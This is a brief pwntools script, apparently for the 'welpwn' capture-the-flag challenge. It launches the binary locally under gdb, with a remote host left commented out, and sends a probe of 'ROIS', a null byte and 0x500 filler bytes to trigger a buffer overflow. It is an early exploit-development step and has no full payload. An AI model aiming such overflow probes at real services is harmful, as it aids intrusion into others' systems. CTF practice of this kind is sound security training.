from pwn import *
host, port =  '111.200.241.244',50984
#p = remote(host,port)
p = process('./welpwn')
gdb.attach("welpwn")
test = 0x000000000040079c
pay = "ROIS"+"\x00"+"A"*0x500
p.sendlineafter("CTF\n",pay)
p.interactive()
